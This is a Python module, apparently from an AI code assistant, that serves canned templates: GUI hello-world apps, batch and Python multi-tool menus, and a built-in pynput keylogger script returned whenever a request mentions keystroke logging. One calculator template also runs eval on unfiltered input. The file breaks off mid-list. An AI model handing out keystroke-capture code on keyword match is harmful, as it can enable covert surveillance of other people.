import json
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from navine.utils.paths import get_project_root

GUI_SIGNAL_RE = re.compile(
    r"\b(?:"
    r"gui|tkinter|tk|pyqt(?:5|6)?|pyside(?:2|6)?|pygame|wxpython|dearpygui|customtkinter|"
    r"desktop\s+app|desktop\s+gui|window(?:s)?|windowed|"
    r"graphical\s+(?:user\s+)?interface|user\s+interface|"
    r"display(?:s|ing)?\s+(?:hello|text|a\s+label|a\s+message)|"
    r"show(?:s|ing)?\s+(?:hello|a\s+window|a\s+label)|"
    r"label\s+(?:with|saying|that)|"
    r"tk\.(?:Tk|Label|Button)|Q(?:Main)?Window|QLabel"
    r")\b",
    re.I,
)

CONSOLE_HELLO_RE = re.compile(
    r"\b(?:print|console|terminal|cli|command\s*line|stdout)\b",
    re.I,
)

PYTHON_PYQT_GUI = (
    "import sys\n"
    "\n"
    "try:\n"
    "    from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget\n"
    "except ImportError:\n"
    "    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget\n"
    "\n"
    "\n"
    "class MainWindow(QMainWindow):\n"
    "    def __init__(self):\n"
    "        super().__init__()\n"
    "        self.setWindowTitle(\"Navine AI - Python App\")\n"
    "        self.setGeometry(100, 100, 420, 320)\n"
    "        central = QWidget()\n"
    "        layout = QVBoxLayout(central)\n"
    "        self.label = QLabel(\"Hello from Navine AI - Python\")\n"
    "        layout.addWidget(self.label)\n"
    "        button = QPushButton(\"Click Me\")\n"
    "        button.clicked.connect(lambda: self.label.setText(\"Button clicked\"))\n"
    "        layout.addWidget(button)\n"
    "        self.setCentralWidget(central)\n"
    "\n"
    "\n"
    "def main():\n"
    "    app = QApplication(sys.argv)\n"
    "    window = MainWindow()\n"
    "    window.show()\n"
    "    sys.exit(app.exec() if hasattr(app, \"exec\") else app.exec_())\n"
    "\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    main()"
)

PYTHON_PYQT_HELLO = (
    "import sys\n"
    "\n"
    "try:\n"
    "    from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel\n"
    "except ImportError:\n"
    "    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel\n"
    "\n"
    "\n"
    "def main():\n"
    "    app = QApplication(sys.argv)\n"
    "    window = QMainWindow()\n"
    "    window.setWindowTitle(\"Hello World\")\n"
    "    window.setGeometry(100, 100, 320, 160)\n"
    "    label = QLabel(\"Hello World\", window)\n"
    "    label.setGeometry(80, 60, 160, 30)\n"
    "    window.show()\n"
    "    sys.exit(app.exec() if hasattr(app, \"exec\") else app.exec_())\n"
    "\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    main()"
)

PYTHON_GUI_APP = (
    "import tkinter as tk\n"
    "\n"
    "\n"
    "def on_click(label):\n"
    "    label.config(text=\"Button clicked\")\n"
    "\n"
    "\n"
    "def main():\n"
    "    root = tk.Tk()\n"
    "    root.title(\"Navine AI - Python App\")\n"
    "    root.geometry(\"400x300\")\n"
    "    label = tk.Label(root, text=\"Hello from Navine AI - Python\", font=(\"Segoe UI\", 12))\n"
    "    label.pack(padx=20, pady=20)\n"
    "    button = tk.Button(root, text=\"Click Me\", command=lambda: on_click(label))\n"
    "    button.pack(pady=10)\n"
    "    root.mainloop()\n"
    "\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    main()"
)

PYTHON_GUI_HELLO = (
    "import tkinter as tk\n"
    "\n"
    "\n"
    "def main():\n"
    "    root = tk.Tk()\n"
    "    root.title(\"Hello World\")\n"
    "    root.geometry(\"320x160\")\n"
    "    label = tk.Label(root, text=\"Hello World\", font=(\"Segoe UI\", 16))\n"
    "    label.pack(expand=True, padx=20, pady=20)\n"
    "    root.mainloop()\n"
    "\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    main()"
)

PYTHON_MULTI_TOOL_BATCH = (
    "import json\n"
    "from datetime import datetime\n"
    "from pathlib import Path\n"
    "\n"
    "\n"
    "def tool_calculator(expr: str) -> str:\n"
    "    allowed = set('0123456789+-*/().% ')\n"
    "    if not expr or any(ch not in allowed for ch in expr):\n"
    "        raise ValueError('Only basic math expressions are allowed')\n"
    "    return str(eval(expr, {\"__builtins__\": {}}, {}))\n"
    "\n"
    "\n"
    "def tool_case(text: str, mode: str) -> str:\n"
    "    if mode == 'upper':\n"
    "        return text.upper()\n"
    "    if mode == 'lower':\n"
    "        return text.lower()\n"
    "    if mode == 'title':\n"
    "        return text.title()\n"
    "    return text\n"
    "\n"
    "\n"
    "def tool_word_count(text: str) -> str:\n"
    "    words = [w for w in text.split() if w.strip()]\n"
    "    return f'words={len(words)} chars={len(text)} lines={len(text.splitlines())}'\n"
    "\n"
    "\n"
    "def tool_batch_rename(folder: str, prefix: str) -> str:\n"
    "    root = Path(folder)\n"
    "    if not root.is_dir():\n"
    "        raise ValueError('Folder not found')\n"
    "    changed = []\n"
    "    for idx, path in enumerate(sorted(root.iterdir()), start=1):\n"
    "        if not path.is_file():\n"
    "            continue\n"
    "        target = root / f'{prefix}_{idx:03d}{path.suffix.lower()}'\n"
    "        if target.exists():\n"
    "            continue\n"
    "        path.rename(target)\n"
    "        changed.append(target.name)\n"
    "    return f'renamed {len(changed)} files'\n"
    "\n"
    "\n"
    "TOOLS = {\n"
    "    '1': ('Calculator', lambda: tool_calculator(input('Expression: ').strip())),\n"
    "    '2': ('Uppercase text', lambda: tool_case(input('Text: '), 'upper')),\n"
    "    '3': ('Lowercase text', lambda: tool_case(input('Text: '), 'lower')),\n"
    "    '4': ('Word count', lambda: tool_word_count(input('Text: '))),\n"
    "    '5': ('Batch rename files', lambda: tool_batch_rename(input('Folder path: ').strip(), input('Prefix: ').strip() or 'file')),\n"
    "}\n"
    "\n"
    "\n"
    "def run_batch(jobs):\n"
    "    results = []\n"
    "    for job in jobs:\n"
    "        tool_id = str(job.get('tool', '')).strip()\n"
    "        payload = job.get('input', '')\n"
    "        name, fn = TOOLS[tool_id]\n"
    "        if tool_id == '1':\n"
    "            out = tool_calculator(str(payload))\n"
    "        elif tool_id in {'2', '3'}:\n"
    "            out = tool_case(str(payload), 'upper' if tool_id == '2' else 'lower')\n"
    "        elif tool_id == '4':\n"
    "            out = tool_word_count(str(payload))\n"
    "        elif tool_id == '5':\n"
    "            parts = str(payload).split('|', 1)\n"
    "            folder = parts[0].strip()\n"
    "            prefix = parts[1].strip() if len(parts) > 1 else 'file'\n"
    "            out = tool_batch_rename(folder, prefix)\n"
    "        else:\n"
    "            out = fn()\n"
    "        results.append({'tool': name, 'output': out})\n"
    "    return results\n"
    "\n"
    "\n"
    "def main():\n"
    "    print('Navine AI - Python Multi-Tool (batch mode supported)')\n"
    "    print('1 Calculator  2 Upper  3 Lower  4 Word count  5 Batch rename  b Batch run  q Quit')\n"
    "    while True:\n"
    "        choice = input('Select tool: ').strip().lower()\n"
    "        if choice in {'q', 'quit', 'exit'}:\n"
    "            break\n"
    "        if choice == 'b':\n"
    "            raw = input('Paste JSON jobs [{\"tool\":\"1\",\"input\":\"1+2\"}, ...]: ').strip()\n"
    "            jobs = json.loads(raw)\n"
    "            for row in run_batch(jobs):\n"
    "                print(f\"[{row['tool']}] {row['output']}\")\n"
    "            continue\n"
    "        if choice not in TOOLS:\n"
    "            print('Unknown tool')\n"
    "            continue\n"
    "        name, fn = TOOLS[choice]\n"
    "        try:\n"
    "            print(f'[{name}]', fn())\n"
    "        except Exception as exc:\n"
    "            print(f'Error: {exc}')\n"
    "\n"
    "\n"
    "if __name__ == '__main__':\n"
    "    main()"
)

def extract_multi_tool_title(task: str) -> str:
    text = (task or "").strip()
    if not text:
        return "Multi-Tool"
    patterns = (
        r"\b(?:call(?:ed)?|name(?:d)?|title(?:d)?)\s+it\s+(?:as\s+|to\s+)?[\"']?(.+?)[\"']?(?:\s*$|\.|,|\sand\b)",
        r"\b(?:call(?:ed)?|name(?:d)?|title(?:d)?)\s+(?:the\s+)?(?:tool|script|file|suite)?\s*(?:as\s+|to\s+)[\"']?(.+?)[\"']?(?:\s*$|\.|,)",
        r"\b(?:call(?:ed)?|name(?:d)?)\s+[\"']([^\"']+)[\"']",
        r"\btitle\s*[:=]\s*[\"']?([^\"'\n]+)[\"']?",
    )
    for pattern in patterns:
        match = re.search(pattern, text, flags=re.I)
        if match:
            raw = re.sub(r"\s+", " ", match.group(1)).strip(" .,'\"")
            raw = re.sub(r"\b(?:in\s+batch|\.bat|please|thanks)\b", "", raw, flags=re.I).strip(" .,'\"")
            if len(raw) >= 2:
                return _title_case_tool_name(raw)
    hitboy = re.search(r"\b(hitboy[\w\-]*(?:\s+[\w\-]+){0,4}\s*multi[\s\-]?tools?)\b", text, flags=re.I)
    if hitboy:
        return _title_case_tool_name(hitboy.group(1))
    try:
        from navine.utils.brand import load_brand

        brand = str((load_brand() or {}).get("display_name") or "Navine").split()[0]
    except Exception:
        brand = "Navine"
    return f"{brand} Multi-Tool"


def _title_case_tool_name(name: str) -> str:
    parts = []
    for token in re.split(r"(\s+|-)", name.strip()):
        if not token or token.isspace() or token == "-":
            parts.append(token)
            continue
        lower = token.lower()
        if lower in ("ai", "cli", "api", "url", "ip", "dns"):
            parts.append(lower.upper())
        elif lower.startswith("hitboy"):
            rest = token[6:]
            parts.append("HitBoy" + rest)
        else:
            parts.append(token[:1].upper() + token[1:].lower() if len(token) > 1 else token.upper())
    out = "".join(parts)
    out = re.sub(r"\bmulti\s*tool\b", "Multi-Tool", out, flags=re.I)
    out = re.sub(r"\bmultitool\b", "Multi-Tool", out, flags=re.I)
    return out.strip() or "Multi-Tool"


def _slug_tool_name(title: str) -> str:
    slug = re.sub(r"[^a-zA-Z0-9]+", "_", title.strip().lower()).strip("_")
    return slug or "multi_tool"


def _looks_like_batch_multi_tool(code: str) -> bool:
    text = code or ""
    lower = text.lower()
    if "@echo off" not in lower:
        return False
    if ":menu" not in lower and "goto menu" not in lower:
        return False
    if "set /p" not in lower:
        return False
    return len(text) >= 400


def _looks_like_python_multi_tool(code: str) -> bool:
    text = code or ""
    if "def " not in text and "input(" not in text:
        return False
    return "menu" in text.lower() and len(text) >= 300


def _try_model_multi_tool(task: str, title: str, lang: str) -> Optional[str]:
    try:
        from navine.text.infer import generate
    except Exception:
        return None
    if lang == "batch":
        prompt = (
            "### User:\n"
            f"Write a complete runnable Windows batch (.bat) multi-tool menu program.\n"
            f"Window title and banner MUST be exactly: {title}\n"
            "Requirements:\n"
            "- Start with @echo off and setlocal EnableExtensions EnableDelayedExpansion\n"
            "- Colorful menu with at least 12 working tools\n"
            "- Include calculator, folders, ping, ipconfig, DNS flush, system info, open URL, "
            "copy/delete file, notepad, temp clean, checksum, and exit\n"
            "- Every option must have real commands, labels, and return to :menu\n"
            "- No markdown fences, no explanation, only the .bat source\n\n"
            f"User request: {task}\n"
            "### Assistant:\n"
            "@echo off\n"
        )
        fence = "batch"
    else:
        prompt = (
            "### User:\n"
            f"Write a complete runnable Python multi-tool CLI menu program named {title}.\n"
            "Include at least 10 real tools with input prompts and error handling. "
            "Return only Python code, no markdown.\n\n"
            f"User request: {task}\n"
            "### Assistant:\n"
        )
        fence = "python"
    try:
        raw = generate(
            prompt,
            max_new_tokens=900,
            temperature=0.2,
            mode="code",
            config_name="text_code",
        )
    except Exception:
        return None
    code = (raw or "").strip()
    if "```" in code:
        from navine.code.format import extract_code_block

        extracted = extract_code_block(code, fence)
        if extracted:
            code = extracted.strip()
    if lang == "batch":
        if not code.lower().lstrip().startswith("@echo"):
            code = "@echo off\n" + code.lstrip()
        if title.lower() not in code.lower():
            code = re.sub(
                r"(?im)^title\s+.+$",
                f"title {title}",
                code,
                count=1,
            )
            if re.search(r"(?im)^title\s+", code) is None:
                code = code.replace("@echo off", f"@echo off\ntitle {title}", 1)
    return code if code else None


def build_batch_multi_tool(title: str, task: str = "") -> str:
    lower = (task or "").lower()
    extra_lines = []
    extra_gotos = []
    next_num = 13
    if re.search(r"\b(?:git|github)\b", lower):
        extra_lines.append(f"echo  {next_num}. Git status")
        extra_gotos.append((str(next_num), "gitstatus"))
        next_num += 1
    if re.search(r"\b(?:wifi|wlan|network)\b", lower):
        extra_lines.append(f"echo  {next_num}. Wi-Fi profiles")
        extra_gotos.append((str(next_num), "wifi"))
        next_num += 1
    if re.search(r"\b(?:disk|storage|space)\b", lower):
        extra_lines.append(f"echo  {next_num}. Disk space")
        extra_gotos.append((str(next_num), "disk"))
        next_num += 1

    menu_extras = "\n".join(extra_lines)
    jump_extras = "\n".join(
        f'if "%choice%"=="{num}" goto {label}' for num, label in extra_gotos
    )
    body_extras = []
    for _, label in extra_gotos:
        if label == "gitstatus":
            body_extras.append(
                ":gitstatus\n"
                "set /p repo=Repo folder: \n"
                'if "%repo%"=="" goto menu\n'
                'cd /d "%repo%" 2>nul\n'
                "git status\n"
                "pause\n"
                "goto menu\n"
            )
        elif label == "wifi":
            body_extras.append(
                ":wifi\n"
                "netsh wlan show profiles\n"
                "pause\n"
                "goto menu\n"
            )
        elif label == "disk":
            body_extras.append(
                ":disk\n"
                "wmic logicaldisk get Name,FreeSpace,Size /value\n"
                "pause\n"
                "goto menu\n"
            )

    return f"""@echo off
setlocal EnableExtensions EnableDelayedExpansion
title {title}
color 0B

:menu
cls
echo ========================================================
echo   {title}
echo   Windows batch multi-tool suite
echo ========================================================
echo  1. Calculator
echo  2. Create folder
echo  3. List folder files
echo  4. Ping host
echo  5. System info
echo  6. Open URL
echo  7. Copy file
echo  8. Delete file
echo  9. Count lines in text file
echo 10. IP config
echo 11. Flush DNS
echo 12. Open Notepad
{menu_extras}
echo  0. Exit
echo ========================================================
set /p choice=Select tool: 

if "%choice%"=="1" goto calc
if "%choice%"=="2" goto mkdir
if "%choice%"=="3" goto list
if "%choice%"=="4" goto ping
if "%choice%"=="5" goto sysinfo
if "%choice%"=="6" goto openurl
if "%choice%"=="7" goto copyfile
if "%choice%"=="8" goto delfile
if "%choice%"=="9" goto wordcount
if "%choice%"=="10" goto ipconfig
if "%choice%"=="11" goto flushdns
if "%choice%"=="12" goto notepad
{jump_extras}
if "%choice%"=="0" goto end
echo Unknown option.
pause
goto menu

:calc
set /p expr=Expression (example 12+8*3): 
set /a result=%expr%
echo Result: %result%
pause
goto menu

:mkdir
set /p folder=Folder path to create: 
if "%folder%"=="" goto menu
mkdir "%folder%" 2>nul
if exist "%folder%" (echo Created: %folder%) else (echo Failed to create folder.)
pause
goto menu

:list
set /p folder=Folder path to list: 
if "%folder%"=="" goto menu
if not exist "%folder%" (
  echo Folder not found.
  pause
  goto menu
)
dir /b "%folder%"
pause
goto menu

:ping
set /p host=Host or IP: 
if "%host%"=="" goto menu
ping -n 4 %host%
pause
goto menu

:sysinfo
echo Computer: %COMPUTERNAME%
echo User: %USERNAME%
echo OS: %OS%
ver
echo.
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
pause
goto menu

:openurl
set /p url=URL: 
if "%url%"=="" goto menu
start "" "%url%"
echo Opened %url%
pause
goto menu

:copyfile
set /p src=Source file: 
set /p dst=Destination path: 
if "%src%"=="" goto menu
if "%dst%"=="" goto menu
copy /Y "%src%" "%dst%"
pause
goto menu

:delfile
set /p target=File to delete: 
if "%target%"=="" goto menu
if not exist "%target%" (
  echo File not found.
  pause
  goto menu
)
del /F /Q "%target%"
echo Deleted.
pause
goto menu

:wordcount
set /p target=Text file path: 
if "%target%"=="" goto menu
if not exist "%target%" (
  echo File not found.
  pause
  goto menu
)
for /f %%A in ('type "%target%" ^| find /c /v ""') do set lines=%%A
echo Lines: %lines%
pause
goto menu

:ipconfig
ipconfig /all
pause
goto menu

:flushdns
ipconfig /flushdns
pause
goto menu

:notepad
set /p target=File to edit (blank = new): 
if "%target%"=="" (
  start notepad
) else (
  start notepad "%target%"
)
goto menu

{"".join(body_extras)}
:end
echo Bye from {title}.
endlocal
exit /b 0
"""


def build_python_multi_tool(title: str, task: str = "") -> str:
    return (
        "#!/usr/bin/env python3\n"
        "from __future__ import annotations\n"
        "\n"
        "import hashlib\n"
        "import os\n"
        "import shutil\n"
        "import socket\n"
        "import subprocess\n"
        "import sys\n"
        "from pathlib import Path\n"
        "\n"
        f"TITLE = {title!r}\n"
        "\n"
        "\n"
        "def tool_calc() -> None:\n"
        "    expr = input('Expression: ').strip()\n"
        "    print('Result:', eval(expr, {'__builtins__': {}}, {}))\n"
        "\n"
        "\n"
        "def tool_mkdir() -> None:\n"
        "    path = Path(input('Folder path: ').strip())\n"
        "    path.mkdir(parents=True, exist_ok=True)\n"
        "    print('Created', path)\n"
        "\n"
        "\n"
        "def tool_list() -> None:\n"
        "    path = Path(input('Folder path: ').strip() or '.')\n"
        "    for item in sorted(path.iterdir()):\n"
        "        print(item.name)\n"
        "\n"
        "\n"
        "def tool_ping() -> None:\n"
        "    host = input('Host: ').strip()\n"
        "    subprocess.run(['ping', '-n', '4', host], check=False)\n"
        "\n"
        "\n"
        "def tool_sysinfo() -> None:\n"
        "    print('Host:', socket.gethostname())\n"
        "    print('User:', os.environ.get('USERNAME') or os.environ.get('USER'))\n"
        "    print('CWD:', Path.cwd())\n"
        "\n"
        "\n"
        "def tool_hash() -> None:\n"
        "    path = Path(input('File path: ').strip())\n"
        "    digest = hashlib.sha256(path.read_bytes()).hexdigest()\n"
        "    print('SHA256:', digest)\n"
        "\n"
        "\n"
        "def tool_copy() -> None:\n"
        "    src = Path(input('Source: ').strip())\n"
        "    dst = Path(input('Destination: ').strip())\n"
        "    shutil.copy2(src, dst)\n"
        "    print('Copied')\n"
        "\n"
        "\n"
        "MENU = [\n"
        "    ('Calculator', tool_calc),\n"
        "    ('Create folder', tool_mkdir),\n"
        "    ('List folder', tool_list),\n"
        "    ('Ping host', tool_ping),\n"
        "    ('System info', tool_sysinfo),\n"
        "    ('SHA256 file', tool_hash),\n"
        "    ('Copy file', tool_copy),\n"
        "]\n"
        "\n"
        "\n"
        "def main() -> None:\n"
        "    while True:\n"
        "        print('=' * 48)\n"
        "        print(TITLE)\n"
        "        print('=' * 48)\n"
        "        for idx, (label, _) in enumerate(MENU, start=1):\n"
        "            print(f'{idx}. {label}')\n"
        "        print('0. Exit')\n"
        "        choice = input('Select tool: ').strip()\n"
        "        if choice == '0':\n"
        "            print('Bye')\n"
        "            return\n"
        "        if choice.isdigit() and 1 <= int(choice) <= len(MENU):\n"
        "            try:\n"
        "                MENU[int(choice) - 1][1]()\n"
        "            except Exception as exc:\n"
        "                print('Error:', exc)\n"
        "        else:\n"
        "            print('Unknown option')\n"
        "\n"
        "\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )


def _save_multi_tool_output(code: str, title: str, lang: str) -> Path:
    from navine.utils.paths import get_project_root

    ext = ".bat" if lang == "batch" else ".py"
    out = get_project_root() / "outputs" / "code" / f"{_slug_tool_name(title)}{ext}"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(code.replace("\n", "\r\n") if lang == "batch" else code, encoding="utf-8")
    return out


def preferred_multi_tool_lang(task: str) -> str:
    lower = (task or "").lower()
    if re.search(r"\bpython\b", lower) and not re.search(r"(?:\.bat\b|\bbatch\b)", lower):
        return "python"
    if re.search(r"(?:\.bat\b|\bbatch\b|\bcmd(?:\.exe)?\b)", lower) and not re.search(r"\bpython\b", lower):
        return "batch"
    return "python"


def wants_multi_tool(task: str) -> bool:
    lower = (task or "").lower()
    lower = re.sub(r"\btookl\b", "tool", lower)
    lower = re.sub(r"\bmutli\b", "multi", lower)
    lower = re.sub(r"\bmulit\b", "multi", lower)
    if re.search(r"\bmulti[\s-]?tools?\b|\bmultitools?\b|\bmultiple\s+tools\b|\btool\s+suite\b|\bswiss\s+army\b", lower):
        return True
    if re.search(r"\b(?:\.bat\b|\bbatch\b)", lower) and re.search(r"\b(?:tools?|menu|suite)\b", lower):
        return True
    if re.search(r"\b(?:create|make|build|write|give|send)\b.{0,50}\btools?\b", lower) and re.search(
        r"\b(?:batch|\.bat|python|menu|suite|script)\b", lower
    ):
        return True
    return False


def wants_keylogger(task: str) -> bool:
    lower = (task or "").lower()
    return bool(
        re.search(
            r"\b(?:key[\s-]?log(?:ger)?|keystroke\s+log(?:ger)?|keyboard\s+log(?:ger)?|log\s+keystrokes?)\b",
            lower,
        )
    )


def _apply_batch_title(code: str, title: str) -> str:
    text = code or ""
    if not re.search(r"(?im)^title\s+", text):
        text = re.sub(r"(?im)^(@echo\s+off\s*)", rf"\1title {title}\n", text, count=1)
    else:
        text = re.sub(r"(?im)^title\s+.+$", f"title {title}", text, count=1)
    lines = text.splitlines()
    out = []
    banner_done = False
    for idx, line in enumerate(lines):
        stripped = line.strip()
        if (
            not banner_done
            and stripped.lower().startswith("echo ")
            and "====" not in stripped
            and (
                "multi" in stripped.lower()
                or "tool" in stripped.lower()
                or "navine" in stripped.lower()
            )
        ):
            out.append(f"echo   {title}")
            banner_done = True
            continue
        out.append(line)
    return "\n".join(out) + ("\n" if text.endswith("\n") else "")


def build_multi_tool_batch(task: str = "") -> Tuple[str, str]:
    title = extract_multi_tool_title(task)
    lang = preferred_multi_tool_lang(task)
    custom_named = bool(
        re.search(
            r"\b(?:call(?:ed)?|name(?:d)?|title(?:d)?)\b",
            task or "",
            flags=re.I,
        )
    )
    model_code = None
    if not custom_named:
        model_code = _try_model_multi_tool(task, title, lang)
    if lang == "batch":
        if model_code and _looks_like_batch_multi_tool(model_code):
            code = _apply_batch_title(model_code.strip() + "\n", title)
        else:
            code = build_batch_multi_tool(title, task).strip() + "\n"
    else:
        if model_code and _looks_like_python_multi_tool(model_code):
            code = model_code.strip() + "\n"
            if title not in code:
                code = f"TITLE = {title!r}\n" + code
        else:
            code = build_python_multi_tool(title, task)
    try:
        path = _save_multi_tool_output(code, title, lang)
        if lang == "batch":
            if re.match(r"(?is)^\s*@echo\s+off", code):
                code = re.sub(
                    r"(?is)^(\s*@echo\s+off\s*)",
                    rf"\1rem Saved as: {path}\n",
                    code,
                    count=1,
                )
            else:
                code = f"@echo off\nrem Saved as: {path}\n" + code
        else:
            code = f"# Saved as: {path}\n" + code
    except Exception:
        pass
    return code, lang


WINDOWS_BATCH_MULTI_TOOL = build_batch_multi_tool("Multi-Tool")

PYTHON_MULTI_TOOL_BATCH = build_python_multi_tool("Multi-Tool")


PYTHON_KEYLOGGER = (
    "import os\n"
    "import sys\n"
    "from datetime import datetime\n"
    "from pathlib import Path\n"
    "\n"
    "try:\n"
    "    from pynput import keyboard\n"
    "except ImportError:\n"
    "    print('Install pynput first: pip install pynput')\n"
    "    sys.exit(1)\n"
    "\n"
    "\n"
    "LOG_PATH = Path(os.environ.get('KEYLOG_PATH', 'keystrokes.log'))\n"
    "\n"
    "\n"
    "def write_key(key):\n"
    "    stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n"
    "    try:\n"
    "        char = key.char\n"
    "    except AttributeError:\n"
    "        char = f'[{key.name}]'\n"
    "    with LOG_PATH.open('a', encoding='utf-8') as handle:\n"
    "        handle.write(f'{stamp} {char}\\n')\n"
    "\n"
    "\n"
    "def main():\n"
    "    print(f'Logging keystrokes to {LOG_PATH.resolve()}')\n"
    "    print('Press Ctrl+C to stop.')\n"
    "    with keyboard.Listener(on_press=write_key) as listener:\n"
    "        listener.join()\n"
    "\n"
    "\n"
    "if __name__ == '__main__':\n"
    "    main()"
)


def build_keylogger(task: str = "") -> Tuple[str, str]:
    return PYTHON_KEYLOGGER, "python"


def _escape_py_string(text: str) -> str:
    return (text or "").replace("\\", "\\\\").replace('"', '\\"')


def extract_display_text(task: str) -> Optional[str]:
    text = (task or "").strip()
    if not text:
        return None
    patterns = [
        r'(?i)(?:that\s+)?(?:says|saying|shows|showing|displays|displaying|prints?|with\s+text)\s+["\']([^"\']{1,80})["\']',
        r'(?i)(?:that\s+)?(?:says|saying|shows|showing|displays|displaying|prints?|with\s+text)\s+([^\n,.!?]{1,80})',
        r'(?i)label\s+(?:with|text)\s+["\']([^"\']{1,80})["\']',
        r'(?i)title\s+["\']([^"\']{1,80})["\']',
        r'(?i)["\']([^"\']{1,80})["\']\s*(?:on|in)\s+(?:the\s+)?(?:gui|window|label|screen)',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if not match:
            continue
        value = match.group(1).strip(" \t\"'`")
        value = re.sub(
            r"(?i)\b(?:using|with|in|via)\s+(?:tkinter|tk|pyqt(?:5|6)?|pyside(?:2|6)?|pygame)\b.*$",
            "",
            value,
        ).strip(" \t\"'`")
        if value and value.lower() not in {
            "hello",
            "hello world",
            "a window",
            "the window",
            "a label",
            "the label",
            "gui",
            "window",
        }:
            return value[:80]
    if wants_hello_world(task):
        return "Hello World"
    return None


def build_tkinter_gui(message: str = "Hello World", title: Optional[str] = None) -> str:
    msg = _escape_py_string(message or "Hello World")
    win_title = _escape_py_string(title or message or "Hello World")
    return (
        "import tkinter as tk\n"
        "\n"
        "\n"
        "def main():\n"
        "    root = tk.Tk()\n"
        f"    root.title(\"{win_title}\")\n"
        "    root.geometry(\"360x180\")\n"
        f"    label = tk.Label(root, text=\"{msg}\", font=(\"Segoe UI\", 24))\n"
        "    label.pack(expand=True, padx=20, pady=20)\n"
        "    root.mainloop()\n"
        "\n"
        "\n"
        "if __name__ == \"__main__\":\n"
        "    main()"
    )


def build_pyqt_gui(message: str = "Hello World", title: Optional[str] = None, prefer6: bool = True) -> str:
    msg = _escape_py_string(message or "Hello World")
    win_title = _escape_py_string(title or message or "Hello World")
    first = "PyQt6" if prefer6 else "PyQt5"
    second = "PyQt5" if prefer6 else "PyQt6"
    return (
        "import sys\n"
        "\n"
        "try:\n"
        f"    from {first}.QtWidgets import QApplication, QMainWindow, QLabel\n"
        "except ImportError:\n"
        f"    from {second}.QtWidgets import QApplication, QMainWindow, QLabel\n"
        "\n"
        "\n"
        "def main():\n"
        "    app = QApplication(sys.argv)\n"
        "    window = QMainWindow()\n"
        f"    window.setWindowTitle(\"{win_title}\")\n"
        "    window.setGeometry(100, 100, 360, 180)\n"
        f"    label = QLabel(\"{msg}\", window)\n"
        "    label.setGeometry(40, 60, 280, 40)\n"
        "    window.show()\n"
        "    sys.exit(app.exec() if hasattr(app, \"exec\") else app.exec_())\n"
        "\n"
        "\n"
        "if __name__ == \"__main__\":\n"
        "    main()"
    )


def build_pygame_gui(message: str = "Hello World", title: Optional[str] = None) -> str:
    msg = _escape_py_string(message or "Hello World")
    win_title = _escape_py_string(title or message or "Hello World")
    return (
        "import sys\n"
        "\n"
        "import pygame\n"
        "\n"
        "\n"
        "def main():\n"
        "    pygame.init()\n"
        "    screen = pygame.display.set_mode((480, 240))\n"
        f"    pygame.display.set_caption(\"{win_title}\")\n"
        "    font = pygame.font.SysFont(\"segoeui\", 48)\n"
        f"    text = font.render(\"{msg}\", True, (255, 255, 255))\n"
        "    clock = pygame.time.Clock()\n"
        "    running = True\n"
        "    while running:\n"
        "        for event in pygame.event.get():\n"
        "            if event.type == pygame.QUIT:\n"
        "                running = False\n"
        "        screen.fill((30, 30, 40))\n"
        "        rect = text.get_rect(center=screen.get_rect().center)\n"
        "        screen.blit(text, rect)\n"
        "        pygame.display.flip()\n"
        "        clock.tick(60)\n"
        "    pygame.quit()\n"
        "    sys.exit(0)\n"
        "\n"
        "\n"
        "if __name__ == \"__main__\":\n"
        "    main()"
    )


def build_gui_for_task(task: str) -> Optional[Tuple[str, str]]:
    if not wants_gui_code(task):
        return None
    framework = preferred_gui_framework(task) or "tkinter"
    message = extract_display_text(task) or "Hello from Navine AI - Python"
    lower = (task or "").lower()
    prefer6 = bool(re.search(r"\bpyqt6\b", lower)) or not re.search(r"\bpyqt5\b", lower)
    if framework == "pygame":
        return build_pygame_gui(message), "python"
    if framework in ("pyqt", "pyside"):
        return build_pyqt_gui(message, prefer6=prefer6), "python"
    return build_tkinter_gui(message), "python"


def preferred_gui_framework(task: str) -> Optional[str]:
    lower = (task or "").lower()
    if re.search(r"\bpygame\b", lower):
        return "pygame"
    if re.search(r"\bpyqt(?:5|6)?\b", lower):
        return "pyqt"
    if re.search(r"\bpyside(?:2|6)?\b", lower):
        return "pyside"
    if re.search(r"\b(?:tkinter|tk)\b", lower):
        return "tkinter"
    if wants_gui_code(task):
        return "tkinter"
    return None


def wants_pyqt(task: str) -> bool:
    return preferred_gui_framework(task) in ("pyqt", "pyside")


def wants_pygame(task: str) -> bool:
    return preferred_gui_framework(task) == "pygame"


def wants_tkinter(task: str) -> bool:
    return preferred_gui_framework(task) == "tkinter"


def wants_gui_code(task: str) -> bool:
    text = (task or "").strip()
    if not text:
        return False
    if GUI_SIGNAL_RE.search(text):
        return True
    lower = text.lower()
    if re.search(r"\b(?:make|create|build|write)\b.{0,48}\b(?:window|gui|interface)\b", lower):
        return True
    if "hello" in lower and "world" in lower and re.search(
        r"\b(?:display|show|window|gui|tkinter|tk|label|pygame|pyqt)\b", lower
    ):
        return True
    return False


def wants_hello_world(task: str) -> bool:
    lower = (task or "").lower()
    return bool(re.search(r"\bhello\s*[,!]?\s*world\b|\bhello\s+world\b", lower))


BUILTIN_TEMPLATES: List[Tuple[List[str], str, str]] = [
    (
[
            "keylogger",
            "key logger",
            "keystroke logger",
            "keyboard logger",
            "log keystrokes",
            "log my keystrokes",
            "python keylogger",
        ],
        "python",
        PYTHON_KEYLOGGER,
    ),
    (
        [
            "gui hello world",
            "hello world gui",
            "tkinter hello",
            "tkinter window",
            "pyqt hello",
            "gui that displays hello",
            "window saying hello",
            "window that says hello",
            "display hello world",
            "show hello world window",
        ],
        "python",
        PYTHON_GUI_HELLO,
    ),
    (
        [
            "gui",
            "tkinter",
            "pyqt",
            "pyside",
            "desktop app",
            "desktop gui",
            "python gui",
            "gui app",
